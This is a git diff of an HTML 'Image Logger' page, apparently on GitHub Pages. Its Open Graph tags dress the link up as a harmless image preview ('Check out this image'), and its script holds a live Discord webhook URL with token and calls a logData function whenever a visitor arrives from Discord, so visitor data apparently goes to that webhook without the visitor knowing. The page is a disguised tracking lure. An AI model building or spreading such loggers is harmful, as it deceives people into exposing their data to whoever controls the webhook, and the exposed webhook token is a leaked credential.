@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Image Logger</title>
     
-    <!-- Force Image Card -->
-    <meta property="og:image" content="https://cdn.discordapp.com/attachments/1280593964357124238/1571993907036684490/image.png?ex=6afe1269&is=6afcc0e9&hm=0ed6e659ba030c1608f0f9978fc8fcfa9b5505a4687a6f91d67e442f8fccf332">
+    <!-- REPLACE THE LINK BELOW WITH YOUR IMGUR DIRECT LINK -->
+    <meta property="og:image" content="https://i.imgur.com/YOUR_IMGUR_LINK_HERE.png"> 
     <meta property="og:title" content="Check out this image">
     <meta property="og:description" content="Click to view full size">
     <meta property="og:url" content="https://bighunnab-bit.github.io/image-logger/">
@@ -23,12 +23,10 @@
 </head>
 <body>
 
-<!-- No img tag here to prevent conflicts -->
-
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1572396924575678506/DHAfoB_LoRotUSRW7xM4JoyN-zK-eKZ82BmtXNMdlXb7Mia2eyzNuXPXJev2eM4chhvG";
 
-    // Check if user came from Discord
+    // Log if opened from Discord
     if (document.referrer.includes("discord.com") || document.referrer.includes("discordapp.com")) {
         logData();
     }
